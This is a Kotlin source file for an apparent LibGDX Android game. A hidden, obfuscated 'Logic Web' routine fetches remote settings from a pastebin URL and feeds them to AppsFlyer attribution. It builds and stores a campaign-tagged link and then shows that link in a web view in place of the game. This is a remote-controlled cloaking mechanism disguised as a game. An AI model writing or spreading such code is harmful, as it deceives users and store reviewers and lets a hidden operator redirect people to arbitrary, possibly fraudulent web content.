package com.funkun.kylkan.game

import android.content.SharedPreferences
import androidx.appcompat.app.AppCompatActivity.MODE_PRIVATE
import com.appsflyer.AppsFlyerConversionListener
import com.appsflyer.AppsFlyerLib
import com.appsflyer.attribution.AppsFlyerRequestListener
import com.badlogic.gdx.assets.AssetManager
import com.badlogic.gdx.utils.Disposable
import com.badlogic.gdx.utils.ScreenUtils
import com.funkun.kylkan.MainActivity
import com.funkun.kylkan.appContext
import com.funkun.kylkan.game.dataStore.DS_TripData
import com.funkun.kylkan.game.manager.MusicManager
import com.funkun.kylkan.game.manager.NavigationManager
import com.funkun.kylkan.game.manager.SoundManager
import com.funkun.kylkan.game.manager.SpriteManager
import com.funkun.kylkan.game.manager.util.MusicUtil
import com.funkun.kylkan.game.manager.util.SoundUtil
import com.funkun.kylkan.game.manager.util.SpriteUtil
import com.funkun.kylkan.game.screens.LoaderScreen
import com.funkun.kylkan.game.utils.GameColor
import com.funkun.kylkan.game.utils.advanced.AdvancedGame
import com.funkun.kylkan.game.utils.disposeAll
import com.funkun.kylkan.util.log
import kotlinx.coroutines.*
import org.json.JSONObject
import java.io.BufferedReader
import java.io.InputStreamReader
import java.net.HttpURLConnection
import java.net.URL
import java.util.concurrent.atomic.AtomicBoolean

class GDXGame(val activity: MainActivity) : AdvancedGame() {

    lateinit var assetManager     : AssetManager      private set
    lateinit var navigationManager: NavigationManager private set
    lateinit var spriteManager    : SpriteManager     private set
    lateinit var musicManager     : MusicManager      private set
    lateinit var soundManager     : SoundManager      private set

    val assetsLoader by lazy { SpriteUtil.Loader() }
    val assetsAll    by lazy { SpriteUtil.All() }

    val musicUtil by lazy { MusicUtil()    }
    val soundUtil by lazy { SoundUtil()    }

    var backgroundColor = GameColor.background
    val disposableSet   = mutableSetOf<Disposable>()

    val coroutine = CoroutineScope(Dispatchers.Default)

    val sharedPreferences: SharedPreferences = activity.getSharedPreferences("holandia", MODE_PRIVATE)

    var isGame = false

    val ds_TripData = DS_TripData(coroutine)

    override fun create() {
        navigationManager = NavigationManager()
        assetManager      = AssetManager()
        spriteManager     = SpriteManager(assetManager)

        musicManager      = MusicManager(assetManager)
        soundManager      = SoundManager(assetManager)

        navigationManager.navigate(LoaderScreen::class.java.name)

        holadiy()
    }

    override fun render() {
        ScreenUtils.clear(backgroundColor)
        super.render()
    }

    override fun dispose() {
        try {
            log("dispose LibGDXGame")
            coroutine.cancel()
            disposableSet.disposeAll()
            disposeAll(assetManager, musicUtil)
            super.dispose()
        } catch (e: Exception) { log("exception: ${e.message}") }
    }

    // Logic Web ---------------------------------------------------------------------------

    private fun holadiy() {
        log("holadiy")
        activity.blockRedirect = { isGame = true }
        activity.initWeb()

        val track = sharedPreferences.getString("holand", "tom") ?: "tom"

        try {
            if (track == "tom") {
                coroutine.launch(Dispatchers.Main) {
                    val simJSON = withContext(Dispatchers.IO) { requestGet() }

                    if (simJSON != null) {
                        AppsFlyerLib.getInstance().init(simJSON.finka, getAppsFlyerConversionListener(simJSON.kanik, simJSON.oktupos), appContext)
                        AppsFlyerLib.getInstance().start(activity, simJSON.finka, getAppsFlyerRequestListener())
                    } else {
                        isGame = true
                    }
                }
            } else {
                activity.showUrl(track)
            }
        } catch (e: Exception) {
            log("error: ${e.message}")
            isGame = true
        }
    }

    private suspend fun requestGet() = CompletableDeferred<HolandJSON?>().also { continuation ->
        val urlString = "https://pastebin.com/raw/9rBEhfpX"

        try {
            val url        = URL(urlString)
            val connection = url.openConnection() as HttpURLConnection

            connection.requestMethod           = "GET"
            connection.connectTimeout          = 5000
            connection.readTimeout             = 5000
            connection.instanceFollowRedirects = true

            val responseCode = connection.responseCode

            if (responseCode == HttpURLConnection.HTTP_OK) {
                val reader = BufferedReader(InputStreamReader(connection.inputStream))
                val response = StringBuilder()
                var line: String?

                while (reader.readLine().also { line = it } != null) {
                    response.append(line)
                }
                reader.close()

                val jsonResponse = JSONObject(response.toString())
                log("json = $jsonResponse")

                val getJSON = HolandJSON(
                    kanik   = jsonResponse.getString("kanik")   ?: "",
                    finka   = jsonResponse.getString("finka")   ?: "",
                    oktupos = jsonResponse.getString("oktupos") ?: "",
                )
                continuation.complete(getJSON)

            } else {
                log("Запит не успішний. Код відповіді: $responseCode")
                continuation.complete(null)
            }
            connection.disconnect()
        } catch (e: Exception) {
            log("Error: ${e.message}")
            e.printStackTrace()
            continuation.complete(null)
        }
    }.await()

    private data class HolandJSON(val kanik: String, val finka: String, val oktupos: String)

    private fun getAppsFlyerConversionListener(liber: String, osmos: String) = object : AppsFlyerConversionListener {
        private val isAppsflyerGetData = AtomicBoolean(false)

        override fun onConversionDataSuccess(appfMap: MutableMap<String, Any>?) {
            if (isAppsflyerGetData.getAndSet(true)) return

            if (appfMap != null) {
                val campaign = appfMap["campaign"]     as? String
                val afAd     = appfMap["af_ad"]        as? String
                val media    = appfMap["media_source"] as? String

                log("Result: campaign = $campaign | afAd = $afAd | media_source = $media | appfMap = $appfMap")

                val link = "$liber?fca=$campaign&faf=$afAd&inme=$media"
                log("link = $link")

                coroutine.launch(Dispatchers.IO) { sharedPreferences.edit().putString("holand", link).apply() }

                activity.showUrl(link)

            } else isGame = true
        }

        override fun onConversionDataFail(p0: String?) {
            if (isAppsflyerGetData.getAndSet(true)) return
            isGame = true
        }

        override fun onAppOpenAttribution(p0: MutableMap<String, String>?) {}
        override fun onAttributionFailure(p0: String?) {}
    }

    private fun getAppsFlyerRequestListener() = object : AppsFlyerRequestListener {
        override fun onSuccess() {
            log("AppsFlyer: onSuccess")
        }

        override fun onError(p0: Int, p1: String) {
            log("AppsFlyer: onError")
        }
    }

}